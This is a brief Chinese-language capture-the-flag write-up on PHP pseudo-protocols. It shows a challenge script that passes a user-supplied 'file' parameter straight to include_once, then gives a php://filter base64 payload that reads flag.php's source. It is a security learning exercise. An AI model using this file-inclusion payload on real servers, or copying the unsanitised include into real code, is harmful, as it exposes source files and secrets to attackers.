#php #PHP 伪协议

传入一个 file 试试
?file=1(值随便)

```php
<?php
	ini_set("allow_url_include","on");
	header("Content-type: text/html; charset=utf-8");
	error_reporting(0);
	$file=$_GET['file'];
	if(isset($file)){    
		show_source(__FILE__);       
		echo 'flag 在flag.php中';
	}else{       
		echo "传入一个file试试";   }
	echo "</br>";
	echo "</br>";
	echo "</br>";
	echo "</br>";
	echo "</br>";
	include_once($file);
?>
```

发现有 include_once 函数；  
include_once()：在脚本执行期间包含并运行指定文件。该函数和 include 函数类似，两者唯一的区别是 使用该函数的时候，php 会加检查指定文件是否已经被包含过，如果是，则不会再被包含。

于是利用伪协议构造，

```url
php://filter/convert.base64-encode/resource=flag.php
```

然后解密 base64
